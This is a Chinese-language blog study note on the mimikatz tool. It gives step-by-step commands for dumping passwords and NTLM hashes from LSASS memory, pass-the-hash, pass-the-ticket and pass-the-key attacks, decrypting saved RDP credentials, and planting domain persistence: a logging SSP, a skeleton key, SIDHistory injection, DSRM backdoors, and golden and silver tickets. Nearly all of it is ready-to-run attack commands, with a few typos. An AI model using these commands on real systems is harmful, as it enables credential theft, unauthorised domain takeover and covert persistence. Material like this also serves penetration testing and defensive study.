<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  .#####.   mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure>

<h3 id="Windows-x64"><a href="#Windows-x64" class="headerlink" title="Windows x64"></a>Windows x64</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\x64\mimikatz.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure>

<h2 id="启动mimikatz控制台后立即执行命令"><a href="#启动mimikatz控制台后立即执行命令" class="headerlink" title="启动mimikatz控制台后立即执行命令"></a>启动mimikatz控制台后立即执行命令</h2><ul>
<li>可以在启动mimikatz控制台后立即执行多条命令</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe &lt;cmd_1&gt; &lt;cmd_2&gt;</span><br></pre></td></tr></table></figure>

<h2 id="退出mimikatz控制台"><a href="#退出mimikatz控制台" class="headerlink" title="退出mimikatz控制台"></a>退出mimikatz控制台</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<h2 id="输出到控制台"><a href="#输出到控制台" class="headerlink" title="输出到控制台"></a>输出到控制台</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br></pre></td></tr></table></figure>

<h2 id="输出到日志文件"><a href="#输出到日志文件" class="headerlink" title="输出到日志文件"></a>输出到日志文件</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz log</span><br></pre></td></tr></table></figure>

<h2 id="抓取内存中的密码"><a href="#抓取内存中的密码" class="headerlink" title="抓取内存中的密码"></a>抓取内存中的密码</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h2 id="通过ProcDump导出内存的数据再抓取密码"><a href="#通过ProcDump导出内存的数据再抓取密码" class="headerlink" title="通过ProcDump导出内存的数据再抓取密码"></a>通过ProcDump导出内存的数据再抓取密码</h2><ul>
<li>如果Windows打了补丁KB2871997，关闭了Wdigest功能，不能直接抓取内存中的密码</li>
<li>如果系统为Windows10及以上或WindowsServer2022R2及以上，内存缓存默认禁止保存明文密码，不能直接抓取内存中的密码</li>
<li>可以通过ProcDump先导出内存的数据，再通过mimikatz抓取密码</li>
</ul>
<h3 id="下载依赖-1"><a href="#下载依赖-1" class="headerlink" title="下载依赖"></a>下载依赖</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><ul>
<li><a href="/302.html?target=https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump">微软官方ProcDump工具下载页面</a></li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wget</span> https://download.sysinternals.com/files/Procdump.zip</span><br><span class="line"><span class="built_in">Expand-Archive</span> <span class="literal">-Path</span> <span class="string">&quot;Procdump.zip&quot;</span> <span class="literal">-DestinationPath</span> <span class="string">&quot;Procdump&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="导出lsass-exe进程存储在内存中的文件"><a href="#导出lsass-exe进程存储在内存中的文件" class="headerlink" title="导出lsass.exe进程存储在内存中的文件"></a>导出lsass.exe进程存储在内存中的文件</h3><blockquote>
<p><code>lsass.exe</code>：进程的可执行文件<br><code>lsass.dmp</code>：导出后的文件</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\procdump64.exe <span class="literal">-accepteula</span> <span class="literal">-ma</span> lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>

<h3 id="载入lsass-dmp文件到攻击者系统内存"><a href="#载入lsass-dmp文件到攻击者系统内存" class="headerlink" title="载入lsass.dmp文件到攻击者系统内存"></a>载入lsass.dmp文件到攻击者系统内存</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;sekurlsa::minidump lsass.dmp&quot;</span><br></pre></td></tr></table></figure>

<h3 id="在攻击者系统抓取密码"><a href="#在攻击者系统抓取密码" class="headerlink" title="在攻击者系统抓取密码"></a>在攻击者系统抓取密码</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure>

<h2 id="PTH（Pass-The-Hash）"><a href="#PTH（Pass-The-Hash）" class="headerlink" title="PTH（Pass The Hash）"></a>PTH（Pass The Hash）</h2><h3 id="抓取密码Hash"><a href="#抓取密码Hash" class="headerlink" title="抓取密码Hash"></a>抓取密码Hash</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<ul>
<li>如果目标是Win7以下的系统，需要获取<code>LM</code>的值</li>
<li>如果目标是Win7及以上的系统，需要获取<code>NTLM</code>的值</li>
</ul>
<h3 id="发送CMD命令"><a href="#发送CMD命令" class="headerlink" title="发送CMD命令"></a>发送CMD命令</h3><blockquote>
<p><code>/domain:&lt;domain&gt;</code>：指定域名，如果不是域用户，则指定主机名<br><code>/user:&lt;username&gt;</code>：指定用户名<br><code>/ntlm:&lt;hash&gt;</code>：指定上一步骤获取的密码哈希值，根据系统选择LM或NTLM<br><code>/run:&quot;cmd.exe /c &lt;cmd&gt;&quot;</code>：定义要指定的CMD命令，如果没有指定则默认在目标系统中打开CMD窗口</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /domain:&lt;domain&gt; /user:&lt;username&gt; /ntlm:&lt;hash&gt; /run:&quot;<span class="built_in">cmd</span>.exe /c &lt;<span class="built_in">cmd</span>&gt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="PTT（Pass-The-Ticket）"><a href="#PTT（Pass-The-Ticket）" class="headerlink" title="PTT（Pass The Ticket）"></a>PTT（Pass The Ticket）</h2><h3 id="利用kekeo根据密码Hash生成凭据（可选）"><a href="#利用kekeo根据密码Hash生成凭据（可选）" class="headerlink" title="利用kekeo根据密码Hash生成凭据（可选）"></a>利用kekeo根据密码Hash生成凭据（可选）</h3><ul>
<li><a href="/2024/11/14/kekeo%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E7%94%9F%E6%88%90%E5%87%AD%E6%8D%AE">传送门</a></li>
</ul>
<h3 id="导出凭据"><a href="#导出凭据" class="headerlink" title="导出凭据"></a>导出凭据</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>

<h3 id="导入凭据"><a href="#导入凭据" class="headerlink" title="导入凭据"></a>导入凭据</h3><blockquote>
<p><code>&lt;file&gt;.kirbi</code>：上一步骤导出的凭据</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt &lt;file&gt;.kirbi</span><br></pre></td></tr></table></figure>

<h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$</span><br></pre></td></tr></table></figure>

<h2 id="PTK（Pass-The-Key）"><a href="#PTK（Pass-The-Key）" class="headerlink" title="PTK（Pass The Key）"></a>PTK（Pass The Key）</h2><ul>
<li>必须在安装了KB2871997补丁且禁用了NTLM的时候才可以使用Key进行登录</li>
</ul>
<h3 id="抓取密钥"><a href="#抓取密钥" class="headerlink" title="抓取密钥"></a>抓取密钥</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys</span><br></pre></td></tr></table></figure>

<ul>
<li>获取<code>aes256_hmac</code>的值</li>
</ul>
<h3 id="发送CMD命令-1"><a href="#发送CMD命令-1" class="headerlink" title="发送CMD命令"></a>发送CMD命令</h3><blockquote>
<p><code>/domain:&lt;domain&gt;</code>：指定域名，如果不是域用户，则指定主机名<br><code>/user:&lt;username&gt;</code>：指定用户名<br><code>/aes256:&lt;aes256&gt;</code>：指定上一步骤获取的<code>aes256_hmac</code>的值<br><code>/run:&quot;cmd.exe /c &lt;cmd&gt;&quot;</code>：定义要指定的CMD命令，如果没有指定则默认在目标系统中打开CMD窗口</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /domain:&lt;domain&gt; /user:&lt;username&gt; /aes256:&lt;aes256&gt; /run:&quot;<span class="built_in">cmd</span>.exe /c &lt;<span class="built_in">cmd</span>&gt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Kerberos凭据"><a href="#Kerberos凭据" class="headerlink" title="Kerberos凭据"></a>Kerberos凭据</h2><h3 id="查看凭据"><a href="#查看凭据" class="headerlink" title="查看凭据"></a>查看凭据</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list</span><br></pre></td></tr></table></figure>

<h3 id="导出凭据-1"><a href="#导出凭据-1" class="headerlink" title="导出凭据"></a>导出凭据</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>

<h2 id="RDP凭据"><a href="#RDP凭据" class="headerlink" title="RDP凭据"></a>RDP凭据</h2><ul>
<li>在使用RDP时勾选了<code>允许我保存凭据</code></li>
</ul>
<h3 id="查看保存的凭据"><a href="#查看保存的凭据" class="headerlink" title="查看保存的凭据"></a>查看保存的凭据</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>

<h3 id="获取credentials文件名"><a href="#获取credentials文件名" class="headerlink" title="获取credentials文件名"></a>获取credentials文件名</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%UserProfile%</span>\appdata\local\microsoft\credentials\*</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2012/12/12 12:12 382 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<h3 id="通过mimikatz获取credentials文件中记录的guidMasterKey值"><a href="#通过mimikatz获取credentials文件中记录的guidMasterKey值" class="headerlink" title="通过mimikatz获取credentials文件中记录的guidMasterKey值"></a>通过mimikatz获取credentials文件中记录的guidMasterKey值</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /<span class="keyword">in</span>:<span class="variable">%LocalAppData%</span>\microsoft\credentials\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**BLOB**</span><br><span class="line">  guidMasterKey : &#123;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&#125;</span><br></pre></td></tr></table></figure>

<h3 id="通过mimikatz获取guidMasterKey对应的MasterKey值"><a href="#通过mimikatz获取guidMasterKey对应的MasterKey值" class="headerlink" title="通过mimikatz获取guidMasterKey对应的MasterKey值"></a>通过mimikatz获取guidMasterKey对应的MasterKey值</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::dpapi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[00000000]</span><br><span class="line">* GUID : &#123;XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX&#125;</span><br><span class="line">* MasterKey : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<h3 id="通过mimikatz解密MasterKey值得到RDP存储的密码"><a href="#通过mimikatz解密MasterKey值得到RDP存储的密码" class="headerlink" title="通过mimikatz解密MasterKey值得到RDP存储的密码"></a>通过mimikatz解密MasterKey值得到RDP存储的密码</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz dpapi::cred /<span class="keyword">in</span>:<span class="variable">%LocalAppData%</span>\microsoft\credentials\XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX /masterkey:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**CREDENTIAL**</span><br><span class="line">  Username : &lt;username&gt;</span><br><span class="line">  CredentialBlob : &lt;password&gt;</span><br></pre></td></tr></table></figure>

<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><ul>
<li>每当登录Windows时，会将明文密码记录到<code>C:\Windows\System32\mimilsa.log</code>文件中</li>
</ul>
<h3 id="重启系统之前记录密码到文件"><a href="#重启系统之前记录密码到文件" class="headerlink" title="重启系统之前记录密码到文件"></a>重启系统之前记录密码到文件</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz misc::memssp</span><br></pre></td></tr></table></figure>

<h3 id="重启系统之后记录密码到文件"><a href="#重启系统之后记录密码到文件" class="headerlink" title="重启系统之后记录密码到文件"></a>重启系统之后记录密码到文件</h3><ul>
<li><p>复制DLL文件<code>mimilib.dll</code>到<code>C:\Windows\System32\</code>文件夹中</p>
</li>
<li><p>添加注册表键值</p>
</li>
</ul>
<blockquote>
<p><code>mimilib</code>：DLL文件名</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /d &quot;kerberos\<span class="number">0</span>msv1_0\<span class="number">0</span>schannel\<span class="number">0</span>wdigest\<span class="number">0</span>tspkg\<span class="number">0</span>pku2u\<span class="number">0</span>mimilib&quot; /t REG_MULTI_SZ</span><br></pre></td></tr></table></figure>

<h3 id="将mimikatz作为域控管理员密码"><a href="#将mimikatz作为域控管理员密码" class="headerlink" title="将mimikatz作为域控管理员密码"></a>将mimikatz作为域控管理员密码</h3><ul>
<li>将mimikatz作为域控管理员密码写入到内存，重启后失效</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz misc::skeleton</span><br></pre></td></tr></table></figure>

<h4 id="建立连接-1"><a href="#建立连接-1" class="headerlink" title="建立连接"></a>建立连接</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;domain&gt;\ipc$ &quot;mimikatz&quot; /user:&lt;domain&gt;\Administrator</span><br></pre></td></tr></table></figure>

<h3 id="给予域内用户域管理员权限"><a href="#给予域内用户域管理员权限" class="headerlink" title="给予域内用户域管理员权限"></a>给予域内用户域管理员权限</h3><ul>
<li>将域内用户的SIDHistory修改为域管理员的SID</li>
</ul>
<blockquote>
<p><code>&lt;username&gt;</code>：域内用户名</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sid::patch</span><br><span class="line">mimikatz sid::add /sam:&lt;username&gt; /new:administrator</span><br></pre></td></tr></table></figure>

<ul>
<li>此时域内用户保留了域管理员权限，同时不改变当前的SID</li>
</ul>
<h3 id="利用DSRM目录服务恢复模式"><a href="#利用DSRM目录服务恢复模式" class="headerlink" title="利用DSRM目录服务恢复模式"></a>利用DSRM目录服务恢复模式</h3><h4 id="获取krbtgt用户的NTLM哈希值"><a href="#获取krbtgt用户的NTLM哈希值" class="headerlink" title="获取krbtgt用户的NTLM哈希值"></a>获取krbtgt用户的NTLM哈希值</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::lsa /patch /name:krbtgt</span><br></pre></td></tr></table></figure>

<h4 id="查看Administrator用户的NTLM哈希值"><a href="#查看Administrator用户的NTLM哈希值" class="headerlink" title="查看Administrator用户的NTLM哈希值"></a>查看Administrator用户的NTLM哈希值</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::sam</span><br></pre></td></tr></table></figure>

<h4 id="修改DSRM的密码"><a href="#修改DSRM的密码" class="headerlink" title="修改DSRM的密码"></a>修改DSRM的密码</h4><ul>
<li>打开目录服务工具</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br></pre></td></tr></table></figure>

<ul>
<li>打开重置DSRM管理员密码工具</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ntdsutil: <span class="title">set</span> <span class="title">dsrm</span> <span class="title">password</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>将DSRM的密码与krbtgt用户保持同步</li>
</ul>
<p>因为krbtgt用户的密码通常不会修改</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重置 DSRM 管理员密码: sync from domain account krbtgt</span><br></pre></td></tr></table></figure>

<ul>
<li>退出重置DSRM管理员密码工具</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重置 DSRM 管理员密码: q</span><br></pre></td></tr></table></figure>

<ul>
<li>退出目录服务工具</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ntdsutil: <span class="title">q</span></span></span><br></pre></td></tr></table></figure>

<h4 id="修改DSRM登录方式"><a href="#修改DSRM登录方式" class="headerlink" title="修改DSRM登录方式"></a>修改DSRM登录方式</h4><blockquote>
<p><code>-value</code>：指定参数值</p>
<blockquote>
<p><code>0</code>：禁用<br><code>1</code>：只能本地登录<br><code>2</code>：支持网络登录</p>
</blockquote>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;hklm:\system\currentcontrolset\control\lsa\&quot;</span> <span class="literal">-name</span> <span class="string">&quot;dsrmadminlogonbehavior&quot;</span> <span class="literal">-value</span> <span class="number">2</span> <span class="literal">-propertyType</span> DWORD</span><br></pre></td></tr></table></figure>

<h4 id="利用PTH传递攻击"><a href="#利用PTH传递攻击" class="headerlink" title="利用PTH传递攻击"></a>利用PTH传递攻击</h4><blockquote>
<p><code>&lt;hash&gt;</code>：krbtgt用户的NTLM哈希值</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::pth /domain:&lt;domain&gt; /user:Administrator /ntlm:&lt;hash&gt;</span><br></pre></td></tr></table></figure>

<h3 id="黄金凭据"><a href="#黄金凭据" class="headerlink" title="黄金凭据"></a>黄金凭据</h3><ul>
<li>利用krbtgt用户的NTLM哈希值制作黄金凭据</li>
</ul>
<h4 id="获取任意域内需要权限维持的用户的SID"><a href="#获取任意域内需要权限维持的用户的SID" class="headerlink" title="获取任意域内需要权限维持的用户的SID"></a>获取任意域内需要权限维持的用户的SID</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<h4 id="获取所有用户的NTLM哈希值"><a href="#获取所有用户的NTLM哈希值" class="headerlink" title="获取所有用户的NTLM哈希值"></a>获取所有用户的NTLM哈希值</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::lsa /patch</span><br></pre></td></tr></table></figure>

<h5 id="获取krbtgt用户的NTLM哈希值-1"><a href="#获取krbtgt用户的NTLM哈希值-1" class="headerlink" title="获取krbtgt用户的NTLM哈希值"></a>获取krbtgt用户的NTLM哈希值</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz lsadump::lsa /patch /name:krbtgt</span><br></pre></td></tr></table></figure>

<h4 id="制作黄金凭据"><a href="#制作黄金凭据" class="headerlink" title="制作黄金凭据"></a>制作黄金凭据</h4><ul>
<li>通过krbtgt用户的NTLM哈希值生成凭据文件</li>
</ul>
<blockquote>
<p><code>/user:&lt;username&gt;</code>：指定任意域内需要权限维持的用户的SID<br><code>/sid:&lt;sid&gt;</code>：指定这个域内用户的SID，不需要后缀<br><code>/krbtgt:&lt;hash&gt;</code>：指定krbtgt用户的NTLM哈希值<br><code>/ticket:&lt;file&gt;.kirbi</code>：定义生成的凭据文件名</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikat kerberos::golden /domain:&lt;domain&gt; /user:&lt;username&gt; /sid:&lt;sid&gt; /krbtgt:&lt;hash&gt; /ticket:&lt;file&gt;.kirbi</span><br></pre></td></tr></table></figure>

<h4 id="导入凭据文件到内存"><a href="#导入凭据文件到内存" class="headerlink" title="导入凭据文件到内存"></a>导入凭据文件到内存</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt &lt;file&gt;.kirbi</span><br></pre></td></tr></table></figure>

<h4 id="建立连接-2"><a href="#建立连接-2" class="headerlink" title="建立连接"></a>建立连接</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$</span><br></pre></td></tr></table></figure>

<h3 id="白银凭据"><a href="#白银凭据" class="headerlink" title="白银凭据"></a>白银凭据</h3><ul>
<li>利用域管理员用户的NTLM哈希值制作白银凭据</li>
<li>白银票据是利用CIFS文件共享服务的漏洞，所以得到的白银凭据只能用于访问文件</li>
</ul>
<h4 id="获取任意域内需要权限维持的用户的SID-1"><a href="#获取任意域内需要权限维持的用户的SID-1" class="headerlink" title="获取任意域内需要权限维持的用户的SID"></a>获取任意域内需要权限维持的用户的SID</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>

<h4 id="获取域控计算机名和密码NTLM哈希值"><a href="#获取域控计算机名和密码NTLM哈希值" class="headerlink" title="获取域控计算机名和密码NTLM哈希值"></a>获取域控计算机名和密码NTLM哈希值</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msv:</span><br><span class="line">  * Username : &lt;computername&gt;</span><br><span class="line">  * Domain   : &lt;domain&gt;</span><br><span class="line">  * NTLM     : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>

<h4 id="制作白银凭据"><a href="#制作白银凭据" class="headerlink" title="制作白银凭据"></a>制作白银凭据</h4><ul>
<li>制作白银凭据并直接导入到内存</li>
</ul>
<blockquote>
<p><code>/user:&lt;username&gt;</code>：指定任意域内需要权限维持的用户的SID<br><code>/sid:&lt;sid&gt;</code>：指定这个域内用户的SID，不需要后缀<br><code>/target:&lt;computername&gt;</code>：指定域控计算机名<br><code>/target:&lt;computername&gt;</code>：指定域控计算机名<br><code>/rc4:&lt;hash&gt;</code>：指定域控计算机密码NTLM哈希值</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:&lt;domain&gt; /user:&lt;username&gt; /sid:&lt;sid&gt; /target:&lt;computername&gt; /rc4:&lt;hash&gt; /service:cifs /ptt</span><br></pre></td></tr></table></figure>

<h4 id="建立连接-3"><a href="#建立连接-3" class="headerlink" title="建立连接"></a>建立连接</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;ip&gt;\ipc$</span><br></pre></td></tr></table></figure>

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>
    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div><svg class="coin" width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.045 25.5454C7.69377 25.5454 2.54504 20.3967 2.54504 14.0454C2.54504 7.69413 7.69377 2.54541 14.045 2.54541C20.3963 2.54541 25.545 7.69413 25.545 14.0454C25.545 17.0954 24.3334 20.0205 22.1768 22.1771C20.0201 24.3338 17.095 25.5454 14.045 25.5454ZM9.66202 6.81624H18.2761C18.825 6.81624 19.27 7.22183 19.27 7.72216C19.27 8.22248 18.825 8.62807 18.2761 8.62807H14.95V10.2903C17.989 10.4444 20.3766 12.9487 20.3855 15.9916V17.1995C20.3854 17.6997 19.9799 18.1052 19.4796 18.1052C18.9793 18.1052 18.5738 17.6997 18.5737 17.1995V15.9916C18.5667 13.9478 16.9882 12.2535 14.95 12.1022V20.5574C14.95 21.0577 14.5444 21.4633 14.0441 21.4633C13.5437 21.4633 13.1382 21.0577 13.1382 20.5574V12.1022C11.1 12.2535 9.52148 13.9478 9.51448 15.9916V17.1995C9.5144 17.6997 9.10883 18.1052 8.60856 18.1052C8.1083 18.1052 7.70273 17.6997 7.70265 17.1995V15.9916C7.71158 12.9487 10.0992 10.4444 13.1382 